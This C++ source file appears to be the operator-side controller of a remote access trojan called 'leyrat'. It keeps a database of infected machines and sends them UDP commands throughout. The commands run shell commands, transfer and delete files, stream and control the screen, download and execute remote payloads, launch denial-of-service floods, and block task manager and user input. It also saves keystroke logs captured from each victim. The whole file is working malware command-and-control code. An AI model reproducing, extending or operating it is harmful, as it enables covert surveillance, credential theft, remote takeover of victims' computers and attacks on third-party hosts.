
#pragma once

#include "leyrat.h"
#include "leybuf.h"
#include "leynet.h"

#include <Windows.h>
#include <stdlib.h>
#include <cstdio>
#include <time.h>

#include <QApplication>
#include <QThread>

#include "mainwindow.h"

#include "filebrowser.h"
#include "offlineusers.h"


#include "ui_mainwindow.h"
#include "ui_filebrowser.h"
#include "ui_offlineusers.h"
#include "ui_screenshare.h"
#include "ui_sruncommand.h"


#define Log printf

extern leynet_udp net;
extern Ui::MainWindow *mainwin;
extern Ui::Filebrowser *fbrowser;
extern Screenshare*screenshare;
extern Ui::Screenshare *screenshareui;
extern Ui::SRuncommand *sruncommandui;

extern Offlineusers *offlineuserwin;
//client management

leyrat::leyrat()
{
    for (int i = 0; i < 100000-1; i++)
        onlineclients[i] = 0;

    numonlineclients = 0;

}

leyrat::~leyrat()
{
    for (int i = 0; i < 100000-1; i++)
		onlineclients[i] = 0;

    numonlineclients = 0;
}


bool leyrat::IsClient(const char *computername, unsigned long diskserial)
{
    HANDLE dbfileread = CreateFile(L"db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

    char *readfile = new char[toread+1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while(read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));

        read.ReadInt32();//version isnt needed
		unsigned long sserial = read.ReadInt32();
		
		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

        if (!strcmp(computername, scomputername)&&diskserial==sserial)
        {
			delete[] readfile;
			return true;
        }

		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);
	return false;
}

bool leyrat::IsOnlineClient(const char *ip)
{
	for (int i = 0; i < 100000; i++)
	{
        if (!onlineclients[i])
			continue;

        if (!strcmp(ip, onlineclients[i]->ip))
			return true;
	}

	return false;
}

bool leyrat::IsOnlineClient(unsigned long diskserial, char*username, char*computername)
{
    for (int i = 0; i < 100000; i++)
    {
        if (!onlineclients[i])
            continue;

        if (strcmp(username, onlineclients[i]->username))
            continue;

        if (strcmp(computername, onlineclients[i]->computername))
            continue;

        if(diskserial!=onlineclients[i]->serial)
            continue;

        return true;
    }

    return false;
}

void leyrat::ClientAdd(const char *ip, unsigned short port, int version, unsigned long diskserial, const char *language, const char *username, const char*computername, const char *os)
{


	if (!IsClient( computername, diskserial))
	{
		unsigned long datalen = 4 + 4 + 4 + strlen(ip) + strlen(language) + strlen(username) + strlen(computername);

        char *csave = new char[datalen+10];

		leybuf save(csave, datalen);

        save.WriteInt32(version);
		save.WriteInt32(diskserial);
		save.WriteString(language);
		save.WriteString(username);
		save.WriteString(computername);
		save.WriteChar('\n');

		unsigned long written;

        HANDLE dbfilewrite = CreateFile(L"db.txt", FILE_APPEND_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!dbfilewrite)
			return;

		int wrotefile = WriteFile(dbfilewrite, csave, save.GetPos(), &written, 0);

		CloseHandle(dbfilewrite);

        free(csave);

		if (!wrotefile)
		{
			return;
		}


	}

    mainwin->tableWidget->setRowCount(numonlineclients+1);

    char snumclients[10] = {0};

    sprintf(snumclients, "%i", numonlineclients);


    mainwin->tableWidget->setItem(numonlineclients, 0, new QTableWidgetItem(language));
    mainwin->tableWidget->setItem(numonlineclients, 1, new QTableWidgetItem(username));
    mainwin->tableWidget->setItem(numonlineclients, 2, new QTableWidgetItem(ip));
    mainwin->tableWidget->setItem(numonlineclients, 3, new QTableWidgetItem(os));
    mainwin->tableWidget->setRowHeight(numonlineclients, 20);

    onlineuser *newuser = new onlineuser;
    newuser->port = port;
    newuser->serial = diskserial;
    newuser->version = version;


    strcpy(newuser->ip, ip);
    strcpy(newuser->language, language);
    strcpy(newuser->username, username);
    strcpy(newuser->computername, computername);
    newuser->last_pingtime = (void*)time(0);
    newuser->row = numonlineclients;

    onlineclients[numonlineclients++] = newuser;

    offlineuserwin->Refresh();
}

void leyrat::ClientRemove(int index)
{
    onlineuser *client = onlineclients[index];

    if(!client)
        return;

    mainwin->tableWidget->removeRow(index);
    mainwin->tableWidget->setRowCount(numonlineclients-1);

    delete client;
    onlineclients[index] = 0;


    numonlineclients -= 1;
}

onlineuser *leyrat::GetClient(int index)
{
    return onlineclients[index];
}

onlineuser *leyrat::GetClient(const char*ip)
{
    for (int i = 0; i < 100000; i++)
    {
        if (!onlineclients[i])
            continue;

        if (!strcmp(ip, onlineclients[i]->ip))
            return onlineclients[i];
    }

    return 0;
}

unsigned short leyrat::GetClientPort(const char *ip)
{
    return 27065;//placeholder
}

int leyrat::GetClientPath(const char *ip, char *buffer, int buffersize)
{
    CreateDirectoryA(ip, 0);


    time_t rawtime;
    tm* timeinfo;

    time (&rawtime);
    timeinfo = localtime (&rawtime);


    char sdate[50];
    strftime(sdate, 50, "%F", timeinfo);

    std::string sfilename = ip;
    sfilename.append("/");

    int size = strlen(sdate);

    if(size>buffersize)
        size = buffersize;

    strncpy(buffer, sfilename.c_str(), sfilename.length());

    return (int)sfilename.length();
}

bool leyrat::GetClientCountry(const char *computername, unsigned long diskserial, char *cbuf)
{
    HANDLE dbfileread = CreateFile(L"db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

	char *readfile = new char[toread + 1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while (read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));


        read.ReadInt32();
		unsigned long sserial = read.ReadInt32();

		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

		if (!strcmp(computername, scomputername) && diskserial == sserial)
		{
			strcpy(cbuf, slanguage);
			delete[] readfile;
			return true;
		}


		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);

	return true;
}


bool leyrat::GetClientUsername(const char *computername, unsigned long diskserial, char *cbuf)
{
    HANDLE dbfileread = CreateFile(L"db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

	char *readfile = new char[toread + 1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while (read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));


        read.ReadInt32();
		unsigned long sserial = read.ReadInt32();

		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

		if (!strcmp(computername, scomputername) && diskserial == sserial)
		{
			strcpy(cbuf, scomputername);
			delete[] readfile;
			return true;
		}


		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);

	return true;
}

bool leyrat::GetClientVersion(const char *computername, unsigned long diskserial, unsigned long* version)
{
    HANDLE dbfileread = CreateFile(L"db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (!dbfileread)
		return false;


	unsigned long toread = GetFileSize(dbfileread, 0);

	char *readfile = new char[toread + 1];


	unsigned long bytesread = 0;

	if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
		return false;

	leybuf read(readfile, toread);

	while (read.GetNumBytesLeft()>0)
	{
		char slanguage[100];
		char susername[260];
		char scomputername[25];
		memset(slanguage, 0, sizeof(slanguage));
		memset(susername, 0, sizeof(susername));
		memset(scomputername, 0, sizeof(scomputername));


		int sver = read.ReadInt32();
		unsigned long sserial = read.ReadInt32();

		read.ReadString(slanguage, 100);
		read.ReadString(susername, 260);
		read.ReadString(scomputername, 25);

		if (!strcmp(computername, scomputername) && diskserial == sserial)
		{
			*version = sver;
			delete[] readfile;
			return true;
		}


		read.ReadChar();

	}

	delete[] readfile;
	CloseHandle(dbfileread);

	return true;
}


int leyrat::GetOfflineUsers(offlineuser**buffer, unsigned int buffersize )
{

    HANDLE dbfileread = CreateFile(L"db.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    if (!dbfileread)
        return 0;


    unsigned long toread = GetFileSize(dbfileread, 0);

    char *readfile = new char[toread + 1];


    unsigned long bytesread = 0;

    if (!ReadFile(dbfileread, readfile, toread, &bytesread, 0))
        return 0;

    unsigned int users = 0;

    leybuf read(readfile, toread);

    while (read.GetNumBytesLeft()>0)
    {

        char slanguage[100];
        char susername[260];
        char scomputername[25];
        memset(slanguage, 0, sizeof(slanguage));
        memset(susername, 0, sizeof(susername));
        memset(scomputername, 0, sizeof(scomputername));


        int sversion = read.ReadInt32();
        unsigned long sserial = read.ReadInt32();

        if(!read.ReadString(slanguage, 100))
            break;

        if(!read.ReadString(susername, 260))
            break;

        if(!read.ReadString(scomputername, 25))
            break;

        read.ReadChar();

        if(IsOnlineClient(sserial, susername, scomputername))
            continue;

        offlineuser *user = new offlineuser;

        user->version = sversion;
        user->serial = sserial;

        memset(user->language, 0, strlen(slanguage)+1);
        memset(user->username, 0, strlen(susername)+1);
        memset(user->computername, 0, strlen(scomputername)+1);

        strcpy(user->language, slanguage);
        strcpy(user->username, susername);
        strcpy(user->computername, scomputername);

        buffer[users] = user;
        users++;

        if(users>buffersize)
            break;
    }

    delete[] readfile;
    CloseHandle(dbfileread);

    return users;
}

//requests

void leyrat::Request_AckServer(const char *ip)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting AckServer!\n", ip, port);
	

	char bpkg[100];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('a');

	net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_RunCmd(const char *ip, const char*torun, bool getresponse)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting RunCmd :: %s!\n", ip, port, torun);

	char bpkg[1024];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('b');
	buf.WriteChar(0);//show

    if(getresponse)
    {
        buf.WriteChar(1);
    }else{
        buf.WriteChar(0);
    }

	buf.WriteString(torun);

	net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_FileList(const char *ip, const char*dir )
{

    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting FileList!\n", ip, port);

	char bpkg[512];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('c');
	buf.WriteString(dir);

	net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_FileDownload(const char *ip, const char*file, const char*savelocation, bool is_update)
{

    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting FileDownload!\n", ip, port);

    char bpkg[500];

    leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('d');

    if(is_update)
    {
        buf.WriteChar(1);
    }else{
        buf.WriteChar(0);
    }

    buf.WriteString(savelocation);

    net.SendTo(ip, port, bpkg, buf.GetPos());

    onlineuser *cl = GetClient(ip);

    if(cl)
    {
        cl->is_uploading = 0;
        cl->is_downloading = new char[strlen(file)+1];
        strcpy(cl->is_downloading, file);
    }
}

void leyrat::Request_FileDelete(const char *ip, const char*file)
{

    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting FileDelete!\n", ip, port);

    char bpkg[500];

    leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('8');
    buf.WriteString(file);

	net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_FileUpload(const char *ip, const char*file)
{
    unsigned short port = GetClientPort(ip);

    Log("[S][%s:%hu] Requesting FileUpload!\n", ip, port);

    char bpkg[500];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('e');
	buf.WriteString(file);

	net.SendTo(ip, port, bpkg, buf.GetPos());

    onlineuser *cl =  GetClient(ip);

    if(cl)
    {
        cl->is_downloading = 0;
        cl->is_uploading = new char[strlen(file)+1];
        strcpy(cl->is_uploading, file);
    }
}

void leyrat::Request_Dos(const char *ip, const char *addr, const char *pkg, unsigned char pkglen, unsigned int time, short atkport, bool is_http)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting Dos!\n", ip, port);

	char bpkg[0xFFF];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('g');
	buf.WriteInt32(time);

	if (time == 0)
	{
		net.SendTo(ip, port, bpkg, buf.GetPos());
		return;
	}


	buf.WriteChar((char)!is_http);
	buf.WriteString(addr);
	buf.WriteInt32(atkport);
	buf.WriteChar(pkglen);
    buf.WriteBytes((void*)pkg, pkglen);
	

	net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_Screenshare(const char *ip, const char*line, const char*preset, int width, int height, unsigned char fps)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting Screenshare __ %lu __ %lu!\n", ip, port, width, height);

    char bpkg[0xFFF];

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('j');

    buf.WriteChar((char)fps);

    buf.WriteInt32(width);
    buf.WriteInt32(height);
    buf.WriteString(preset);
    buf.WriteString(line);

    net.SendTo(ip, port, bpkg, buf.GetPos());


    onlineuser *cl = GetClient(ip);

    if(cl)
    {
        cl->is_screensharing = true;
    }

}

void leyrat::Request_ScreenshareInput(const char *ip, int x, int y, int type, int data)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s] Requesting Screenshare input mouse [%i:%i] %i, %i!\n", ip, x, y, type, data);

    char bpkg[0xFFF];

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('l');
    buf.WriteChar(1);

    buf.WriteInt32(x);
    buf.WriteInt32(y);
    buf.WriteInt32(type);
    buf.WriteInt32(data);

    net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_ScreenshareInput(const char *ip, unsigned char numkeystrokes, unsigned char*keystrokes, unsigned int keystrokeslen)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting Screenshare input key!\n", ip, port);

    char bpkg[0xFFF] = {0};

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('l');
    buf.WriteChar(0);
    buf.WriteChar(numkeystrokes);

    buf.WriteBytes(keystrokes, keystrokeslen);

    net.SendTo(ip, port, bpkg, buf.GetPos());

}

void leyrat::Request_HTTPDownload(const char *ip, const char*url, const char*store, bool exec, bool update)
{

    unsigned short port = GetClientPort(ip);

    if(url==0||strlen(url)==0)
        return;


    Log("[S][%s:%hu] Requesting http download %x _ %x!\n", ip,port, exec, update);

    char addr[255];
    char file[255];

    std::string surl = url;
    surl.erase(0, 7);

    std::string saddr = surl;
    saddr.erase(saddr.find_first_of('/'));

    strcpy(addr, saddr.c_str());
    addr[saddr.length()]=0;

    std::string sfile = surl;
    sfile.erase(0, sfile.find_first_of('/'));

    strcpy(file, sfile.c_str());
    file[sfile.length()]= 0;

	char extras = 0;

	if (update)
		extras = 2;

	if (exec)
		extras = 1;

	char bpkg[0xFFF];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('1');

	buf.WriteString(addr);
	buf.WriteString(file);
	buf.WriteString(store);
	buf.WriteChar(extras);

	net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_Suicide(const char *ip)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting suicide!\n", ip, port);

	char bpkg[100];

	leybuf buf(bpkg, sizeof(bpkg));
	buf.WriteString("\xDB\xDB", true);
	buf.WriteChar('2');

	net.SendTo(ip, port, bpkg, buf.GetPos());
}



void leyrat::Request_InputBlock(const char*ip, bool is_mouse, bool should_block)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting InputBlock!\n", ip, port);

    char bpkg[100];

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('3');

    if(is_mouse)
    {
        buf.WriteChar(0);
    }else{
       buf.WriteChar(1);
    }

    buf.WriteChar((char)should_block);

    net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_TaskmgrBlock(const char*ip, bool should_block)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting TaskmgrBlock!\n", ip, port);

    char bpkg[100];

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('4');
    buf.WriteChar((char)should_block);

    net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_TaskbarBlock(const char*ip, bool should_block)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting TaskbarBlock!\n", ip, port);

    char bpkg[100];

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('5');
    buf.WriteChar((char)should_block);

    net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_DesktopBlock(const char*ip, bool should_block)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting DestopBlock!\n", ip, port);

    char bpkg[100];

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('6');
    buf.WriteChar((char)should_block);

    net.SendTo(ip, port, bpkg, buf.GetPos());
}

void leyrat::Request_DiskTray(const char *ip, bool should_open)
{
    unsigned short port = GetClientPort(ip);
    Log("[S][%s:%hu] Requesting DiskTray!\n", ip, port);

    char bpkg[100];

    leybuf buf(bpkg, sizeof(bpkg));
    buf.WriteString("\xDB\xDB", true);
    buf.WriteChar('7');
    buf.WriteChar((char)should_open);

    net.SendTo(ip, port, bpkg, buf.GetPos());
}

//callbacks

void leyrat::Callback_AckServer(const char *ip, unsigned short port, const char*type)
{
    Log("[R][%s] Acknowledged Server %s!\n", ip, type);
}

extern SRuncommand *sruncmd;

void leyrat::Callback_RunCmd(const char *ip, const char*rancmd, int len)
{
    Log("[R][%s] Ran cmd! ==\n", ip);
    Log("%s\n==\n", rancmd);



    char*stored = new char[len+1];
    memset(stored, 0, len+1);
    memcpy(stored, rancmd, len);

    emit sruncmd->AddConText(stored, len);


}

void leyrat::Callback_FileList(const char *ip, char**files, int numfiles)
{
    Log("[R][%s] Listed files!\n", ip);
    //you could also create it dinamically

    if(numfiles==1)
        return;

    QTreeWidget * tree = fbrowser->treeWidget;


    while(tree->topLevelItemCount())
    {
        tree->takeTopLevelItem(0);

    }

    QTreeWidgetItem* header = tree->headerItem();

    const QByteArray headerbytes = header->text(0).toLatin1();

    if(strcmp(files[0], "C:/*.*")!=0)
    {
        QTreeWidgetItem * item = new QTreeWidgetItem();
        item->setText(0, "..");
        tree->addTopLevelItem(item);

    }

    for(int i=1; i<numfiles; i++)
    {

        QTreeWidgetItem * item = new QTreeWidgetItem();

        if(!strcmp(files[i], "..")||!strcmp(files[i], "."))
            continue;

        item->setText(0, files[i]);
        tree->addTopLevelItem(item);
    }

    files[0][strlen(files[0])-3] = 0;

    header->setText(0, files[0]);
}

void leyrat::Callback_FileDownload(const char *ip)
{

    Log("[R][%s] Downloaded file!\n", ip);
}

void leyrat::Callback_FileDelete(const char *ip)
{

    Log("[R][%s] Deleted file!\n", ip);

}

void leyrat::Callback_FileUpload(const char *ip, char*filename)
{
    Log("[R][%s] Uploaded file!\n", ip);
}

void leyrat::Callback_Dos(const char *ip)
{
    Log("[R][%s] Started dos!\n", ip);
}


static int read_buffer(void *opaque, uint8_t *buf, int buf_size)
{
    // This function must fill the buffer with data and return number of bytes copied.
    // opaque is the pointer to private_data in the call to av_alloc_put_byte (4th param)

    memcpy(buf, opaque, buf_size);
    return buf_size;
}

int lastscreenshare_w = 0;
int lastscreenshare_h = 0;

bool initiated = false;

extern int screenshare_blockimg;

void leyrat::Callback_Screenshare(const char *ip, int width, int height, int realwidth, int realheight, int size, const unsigned char*cdata)
{
    Log("[R][%s] Screenshare [%i|%i]!\n", ip, width, height);

    if(screenshare_blockimg)
    {
        screenshare_blockimg--;
        return;
    }

    lastscreenshare_w = realwidth;
    lastscreenshare_h = realheight;

    Log("[R][%s] Screenshare, Rec Full Buf!\n", ip);

    QImage img(cdata, width, height, QImage::Format_RGB32);


    QPixmap pixmap = QPixmap::fromImage(img);

    if(pixmap.isNull())
        return;

    QPixmap scaled=pixmap.scaled ( screenshareui->label->width(), screenshareui->label->height() );

    if(scaled.isNull())
        return;

    printf("SCALED: %i __ %i\n", screenshareui->label->width(), screenshareui->label->height());

    emit screenshare->NewImage(scaled);

}

void leyrat::Callback_ScreenshareInput(const char *ip)
{
    Log("[R][%s] Screenshare input!\n", ip);
}

void leyrat::Callback_HTTPDownload(const char *ip)
{
    Log("[R][%s] Received http download!\n", ip);
}

void leyrat::Callback_Suicide(const char *ip)
{
    Log("[R][%s] Removed rat!\n", ip);
}

void leyrat::Callback_KeyLog(const char *ip, char*keylog)
{
    Log("[R][%s] Uploaded KeyLog!\n", ip);

    CreateDirectoryA(ip, 0);


    time_t rawtime;
    tm* timeinfo;

    time (&rawtime);
    timeinfo = localtime (&rawtime);


    char sdate[50];
    strftime(sdate, 50, "%F", timeinfo);

    std::string sfilename = ip;
    sfilename.append("/");
    sfilename.append("keylog_");
    sfilename.append(sdate);
    sfilename.append(".txt");


    Log("[R][%s] Writing file to: %s\n", ip, sfilename.c_str());

    FILE* f = fopen(sfilename.c_str(), "a+b");

    if(!f)
    {
        f = fopen(sfilename.c_str(), "wb");
    }

    if(!f)
        return;

    fwrite(keylog, sizeof(char), strlen(keylog), f);
    fclose(f);
}


void leyrat::Callback_InputBlock(const char*ip)
{

    Log("[R][%s] InputBlock!\n", ip);

}

void leyrat::Callback_TaskmgrBlock(const char*ip)
{

    Log("[R][%s] TaskmgrBlock!\n", ip);

}

void leyrat::Callback_TaskbarBlock(const char*ip)
{

    Log("[R][%s] TaskbarBlock!\n", ip);

}

void leyrat::Callback_DestopBlock(const char*ip)
{

    Log("[R][%s] DestopBlock!\n", ip);

}

void leyrat::Callback_DiskTray(const char*ip)
{

    Log("[R][%s] DiskTray!\n", ip);

}

void leyrat::Callback_LastPing(const char*ip)
{

    //Log("[R][%s] LastPing!\n", ip);

    onlineuser *cl = GetClient(ip);

    if(!cl)
        return;

    cl->last_pingtime = (void*)time(0);

}

